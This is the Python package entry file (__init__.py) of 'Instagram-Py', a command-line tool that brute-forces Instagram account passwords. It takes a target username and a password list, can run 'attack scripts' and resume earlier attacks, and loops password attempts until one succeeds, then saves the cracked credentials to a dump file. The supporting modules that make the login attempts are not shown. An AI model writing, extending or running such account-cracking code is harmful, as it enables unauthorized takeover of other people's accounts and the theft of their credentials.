# The MIT License.
# Copyright (C) 2017 The Future Shell , DeathSec.
#
# @filename    : __init__.py
# @description : The traditional python package __init__ file

import argparse
import os
import sys
from .InstagramPyCLI import InstagramPyCLI
from .InstagramPySession import InstagramPySession, DEFAULT_PATH
from .InstagramPyInstance import InstagramPyInstance
from .InstagramPyDumper import InstagramPyDumper
from .InstagramPyScript import InstagramPyScript
from .InstagramPyConfigurationCreator import InstagramPyConfigurationCreator
from datetime import datetime
from .AppInfo import appInfo as AppInformation
from .colors import *

__version__ = AppInformation['version']


'''
Arguments for instagram-py command-line tool
'''
cli_parser = argparse.ArgumentParser(
    epilog=AppInformation['example']
)

# nargs = '+' , makes them positional argument.
cli_parser.add_argument('--username',  # parse username from command line
                        '-u',
                        type=str,
                        help='username for Instagram account'
                        )

cli_parser.add_argument('--password-list',  # parse path to password list file
                        '-pl',
                        type=str,
                        help='password list file to try with the given username.'
                        )

cli_parser.add_argument('--script',
                        '-s',
                        type=str,
                        help='Instagram-Py Attack Script.'
                        )

cli_parser.add_argument('--inspect-username',
                        '-i',
                        type=str,
                        help='Username to inspect in the instagram-py dump.'
                        )

cli_parser.add_argument('--create-configuration',
                        '-cc',
                        action='count',
                        help='Create a Configuration file for Instagram-Py with ease.'
                        )

cli_parser.add_argument('--default-configuration',
                        '-dc',
                        action='count',
                        help='noconfirm for Instagram-Py Configuration Creator!'
                        )

cli_parser.add_argument('--countinue',
                        '-c',
                        action='count',
                        help='Countinue the previous attack if found.'
                        )
cli_parser.add_argument('--verbose',  # check if the user wants verbose mode enabled
                        '-v',
                        action='count',
                        help='Activate Verbose mode. ( Verbose level )'
                        )


def ExecuteInstagramPy():
    Parsed = cli_parser.parse_args()

    if Parsed.create_configuration is not None:
        if Parsed.default_configuration is not None:
            InstagramPyConfigurationCreator(os.path.expanduser(
                '~') + "/instapy-config.json").create()
        else:
            InstagramPyConfigurationCreator(os.path.expanduser(
                '~') + "/instapy-config.json").easy_create()
    elif Parsed.inspect_username is not None:
        InstagramPyDumper(Parsed.inspect_username).Dump()
    elif Parsed.script is not None:
        if not os.path.isfile(Parsed.script):
            print("No Attack Script found at {}".format(Parsed.script))
            sys.exit(-1)
        InstagramPyScript(Parsed.script).run()
    elif Parsed.username is not None and Parsed.password_list is not None:
        cli = InstagramPyCLI(appinfo=AppInformation,
                             started=datetime.now(), verbose_level=Parsed.verbose, username=Parsed.username)

        cli.PrintHeader()
        cli.PrintDatetime()
        session = InstagramPySession(
            Parsed.username, Parsed.password_list, DEFAULT_PATH, DEFAULT_PATH, cli)
        session.ReadSaveFile(Parsed.countinue)
        instagrampy = InstagramPyInstance(cli, session)
        while not instagrampy.PasswordFound():
            instagrampy.TryPassword()
        session.WriteDumpFile(
            {
                "id": Parsed.username,
                "password": session.CurrentPassword(),
                "started": str(cli.started)
            }
        )
    else:
        cli_parser.print_help()
    print('\n{}Report bug, suggestions and new features at {}{}https://github.com/deathsec/instagram-py{}'
          .format(Fore.GREEN,
                  Style.RESET_ALL,
                  Style.BRIGHT,
                  Style.RESET_ALL
                  ))
    sys.exit(0)
